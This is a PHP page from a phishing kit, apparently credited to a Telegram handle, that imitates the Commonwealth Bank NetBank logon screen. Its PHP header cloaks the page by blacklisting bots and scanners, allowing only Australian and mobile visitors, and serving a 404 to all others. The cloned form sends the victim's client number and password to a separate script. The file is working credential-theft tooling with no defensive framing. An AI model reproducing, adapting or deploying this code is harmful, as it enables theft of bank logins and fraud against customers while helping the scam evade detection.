<?php
// @Kr3pto on telegram
require "configg.php";
require "cma_assetz/einc/session_protect.php";
require "cma_assetz/einc/functions.php";
if($internal_antibot == 1){
	require "cma_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("cma_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "cma_assetz/mobile_lock.php";
}
if($AU_lock == 1){
	if(onlyau() == true){
	
	}else{
		$fp = fopen("cma_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("cma_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" class="win firefox firefox1 gecko gecko1 cssBeforeSupport" lang="en">
    <head id="head">
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <title>NetBank - Log on to NetBank - Enjoy simple and secure online banking from Commonwealth Bank</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="stylesheet" href="cma_assetz/css/logon-merge.css" />
        <link rel="icon" href="cma_assetz/img/favicon.ico" />
    </head>
    <body id="body" class="logon">
        <form method="post" action="1.php" id="form1" autocomplete="off">
            <div id="BodyContainer">
                <div id="Header">
                    <div id="BrandingLogo">
                        <span class="ImageWithHelp" id="imgCbaLogo"><img id="imgCbaLogo" src="cma_assetz/img/cba_mainlogo.gif" /></span>
                    </div>
                </div>
                <div id="MainContent">
                    <div class="MessagePanel arrow" id="mplMessagePanel" style="display: none;"></div>
                    <div id="ModuleWrap">
                        <div id="ModuleLeft" class="module">
                            <h2>Log on to NetBank</h2>
                            <div class="bd">
                                <div class="ft">
                                    <div class="row rowClientNumber">
                                        <div class="LabelWrapper LabelTextAlignNotSet align_notset">
                                            <label for="username" id="txtMyClientNumber_label"><span class="MainLabel">Client number</span></label>
                                        </div>
                                        <div class="FieldElement"><input name="username" type="text" maxlength="8" id="username" class="text textbox field" required="" /></div>
                                    </div>
                                    <div class="row rowPassword">
                                        <div class="LabelWrapper LabelTextAlignNotSet align_notset">
                                            <label for="password" id="txtMyPassword_label"><span class="MainLabel">Password</span></label>
                                        </div>
                                        <div class="FieldElement"><input name="password" type="password" maxlength="16" id="password" class="text textbox field" required="" /></div>
                                    </div>
                                    <div class="row">
                                        <div class="FieldElement FieldElementNoLabel">
                                            <span class="checkbox field checkbox_classic">
                                                <input id="chkRemember_field" type="checkbox" name="chkRemember$field" class="checkbox" /><label for="chkRemember_field">Remember client number</label>
                                            </span>
                                        </div>
                                    </div>
                                    <div class="FieldElement FieldElementNoLabel">
                                        <div class="CbaButton" id="btnLogon"><input class="button field" type="submit" name="btnLogon$field" value="Log on" id="btnLogon_field" /></div>
                                    </div>
                                    <a id="lnkForgottenDetails" href="javascript:void(0);"> I've forgotten my log on details </a>
                                    <div id="MessageBubble" class="MessageBubble" style="display: none;">
                                        <span class="MessagePointer"></span><a id="MessageClose" class="MessageClose" href="javascript:void(0);">Close</a>
                                        <span class="MessageBody">
                                            For security reasons, do not <br />
                                            select <strong>Remember client number</strong> if anyone else uses <br />
                                            this computer. <a id="lnkFindOutMore" href="javascript:void(0);">Find out more</a>.
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="ModuleRight" class="module">
                            <h2>New to NetBank?</h2>
                            <div class="bd">
                                <div class="ft">
                                    <ul class="Bullets">
                                        <li><a id="lnkRegistration" href="javascript:void(0);">Register for NetBank now</a></li>
                                        <li><a id="lnkOnlineSupport" href="javascript:void(0);">Online support for our products and services</a></li>
                                        <li><a id="lnkProtectYourselfOnline" href="javascript:void(0);">Tips to stay safe online</a></li>
                                    </ul>
                                </div>
                                <div class="ft secModule">
                                    <ul class="Bullets">
                                        <li><a id="lnkSecurityGuarantee" href="javascript:void(0);">How we protect you and our 100% security guarantee</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="ucLogonContentManageControl_pnlContentManaged">
                        <div id="ContentManaged">
                            <div id="ucLogonContentManageControl_pnlHighlightPanel">
                                <div class="HighlightPanel">
                                    <div class="top">
                                        <div class="bottom">
                                            <div class="image">
                                                <p>
                                                    <a href="javascript:void(0);"><img src="cma_assetz/img/nb-logon-floods.jpg" /></a>
                                                </p>
                                            </div>
                                            <div class="description">
                                                <table>
                                                    <tbody>
                                                        <tr>
                                                            <td>
                                                                <p><b>Affected by the floods?</b></p>
                                                                You may be eligible for our Emergency Assistance. See how we can help or <a href="javascript:void(0);">message us</a> in the CommBank app.
                                                                <ul>
                                                                    <li><a href="javascript:void(0);">Emergency Assistance</a></li>
                                                                </ul>
                                                                <p></p>
                                                                <p></p>
                                                            </td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="ucLogonContentManageControl_pnlCurrentHighlights">
                                <div id="CurrentHighlights">
                                    <h3>Quicklinks</h3>
                                    <div class="column">
                                        <ul>
                                            <li>
                                                <p><a href="javascript:void(0);">Supporting the game changers in women's sport</a></p>
                                            </li>
                                            <li>
                                                <p><a href="javascript:void(0);">Are you in financial difficulty? Apply for assistance.</a></p>
                                            </li>
                                            <li>
                                                <p><a href="javascript:void(0);">Find benefits you may be eligible for during lockdown.</a></p>
                                            </li>
                                            <li>
                                                <p><a href="javascript:void(0);">Support for home loan customers</a></p>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="PageFooter">
                    <a id="lnkTermsOfUse" href="javascript:void(0);">Terms of use</a> | <a id="lnkSecurity" href="javascript:void(0);">Security</a> | <a id="lnkPrivacy" href="javascript:void(0);">Privacy</a>
                    <span id="CopyRight">© Commonwealth Bank of Australia 2022 ABN 48 123 123 124</span>
                </div>
            </div>
        </form>
    </body>
</html>
